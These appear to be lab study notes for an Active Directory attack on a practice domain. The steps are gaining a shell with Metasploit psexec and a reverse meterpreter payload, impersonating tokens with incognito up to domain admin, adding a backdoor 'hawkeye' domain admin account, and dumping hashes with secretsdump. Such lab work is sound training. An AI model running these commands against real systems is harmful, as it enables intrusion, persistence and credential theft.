We are going to use Metasploit for this. There are also other tools like incognito (standalone tool)

## Establish a shell

We are using the metasploit module *exploit/windows/smb/psexec* in order to get a shell on THEPUNISHER:
```msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set rhosts 10.0.0.19
set smbuser frank
set smbpass Password1
set smbdomain MARVEL.local
set lhost 10.0.0.11
```

Upon running the exploit we get a shell:
![[Pasted image 20240321170347.png]]

**Optional:** Check our privileges:
![[Pasted image 20240321170506.png]]
Issue the command `exit` to return to the meterpreter shell.

## Incognito module

Make sure that *frank* is logged in on THEPUNISHER, such that a delegation token exists. 
Load incognito module in msfconsole:
```msfconsole
load incognito
```
![[Pasted image 20240321170800.png]]

When we type in `help` we can see the available *incognito* commands:
![[Pasted image 20240321170841.png]]

List user tokens:
```msfconsole
list_tokens -u
```

Results:
![[Pasted image 20240321171221.png]]

Impersonate frank:
```msfconsole
impersonate_token MARVEL\\frank
```

Impersonation successful! Check who we are in the system shell:
![[Pasted image 20240321171439.png]]

Undo impersonation with *rev2self*:
(_rev2self_ = Revert back to the original user you used to compromise the target)
```msfconsole
rev2self
```

### Impersonate administrator

Login into THEPUNISHER with the domain administrator account. This will create a delegate token for the domain admin, which we can impersonate via our local administrator access.

List user tokens again:
```msfconsole
list_tokens -u
```

From the output we can see that now we have a delegation token of the domain admin:
![[Pasted image 20240321172033.png]]

Impersonate the domain admin:
```msfconsole
impersonate_token MARVEL\\administrator
```

We escalated our privileges now to a domain admin:
![[Pasted image 20240321172235.png]]

## Create a new domain admin user

We now create a new user **hawkeye** with the password **Password1@**:
```msfconsole
net user /add hawkeye Password1@ /domain
```

Successfully create the new user:
![[Pasted image 20240321172538.png]]

Add the user to the domain admin group:
```msfconsole
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

Success:
![[Pasted image 20240321172743.png]]

This is it, we create a new domain admin user :D

**Proof:**
In a new console window use *secretsdump.py* on the DC:
```bash
secretsdump.py MARVEL.local/hawkeye:'Password1@'@10.0.0.18 
```

![[Pasted image 20240321173230.png]]